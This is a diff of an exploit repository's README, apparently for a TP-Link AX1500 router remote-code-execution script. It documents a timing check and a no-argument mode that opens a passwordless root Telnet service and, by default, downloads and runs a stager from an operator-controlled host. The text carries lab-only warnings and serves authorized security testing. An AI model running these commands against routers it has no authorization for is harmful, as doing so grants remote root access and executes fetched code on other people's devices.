@@ -71,15 +71,47 @@ The primary script also defines the following CLI modes:
 
 The last two options are intrusive. Do not use them on operational networks without an explicit test plan, and do not leave a passwordless shell accessible.
 
-### Automated script
+### Automated script (`ax1500_doh_rce_auto.py`)
 
-`exploit/ax1500_doh_rce_auto.py` accepts the same **explicit CLI arguments** as the primary script; inspect them with:
+The automatic script has **two different launch modes**.
+
+**1. Explicit CLI mode (timing check only)**
+
+Run from the repository root. This mode accepts positional arguments and does **not** run the automatic stager/Telnet sequence:
 
 ```bash
-python3 exploit/ax1500_doh_rce_auto.py --help
+read -r -s -p "Router admin password: " TP_ADMIN_PASSWORD
+echo
+python3 exploit/ax1500_doh_rce_auto.py 192.168.0.1 "$TP_ADMIN_PASSWORD" --check
+unset TP_ADMIN_PASSWORD
 ```
 
-It additionally supports a **no-argument automation mode** configured through environment variables:
+Replace `192.168.0.1` with the LAN IP of the router you are authorized to test. `--check` sends an active timing-based command and can misclassify slow responses. Inspect the full CLI syntax with `python3 exploit/ax1500_doh_rce_auto.py --help`.
+
+**2. No-argument automation mode (intrusive; isolated lab only)**
+
+Unlike `--check`, launching the script **without arguments starts a passwordless root Telnet service** after a successful check. `RUN_STAGER=0` only disables the downloaded-script execution step; `AUTO_OPEN_TELNET=0` only disables opening the local Telnet client. Neither disables the Telnet service on the router.
+
+The following example suppresses payload retrieval and automatic client launch; it **still starts the Telnet service** and therefore must not be used on a production router:
+
+```bash
+export IP_ADDR=192.168.0.1
+export HOST_IP=192.0.2.10  # Placeholder; still required when RUN_STAGER=0
+export RUN_STAGER=0
+export AUTO_OPEN_TELNET=0
+
+read -r -s -p "Router admin password: " PASSWORD
+echo
+export PASSWORD
+
+python3 exploit/ax1500_doh_rce_auto.py
+
+unset PASSWORD IP_ADDR HOST_IP RUN_STAGER AUTO_OPEN_TELNET
+```
+
+`192.0.2.10` is a documentation-only placeholder. The script reads configuration from the **environment**, not from a `.env` file. The default no-argument behavior is more invasive than the example above: `RUN_STAGER=1` downloads and executes a script from `http://HOST_IP/STAGER_PATH` (default path `/x`), then starts Telnet and tries to open the local client. It does **not** host or create the staged file. Review and control any staged script in your isolated lab, and disable the resulting root Telnet service when testing is complete.
+
+No-argument mode uses these environment variables:
 
 | Variable | Purpose | Default |
 | --- | --- | --- |
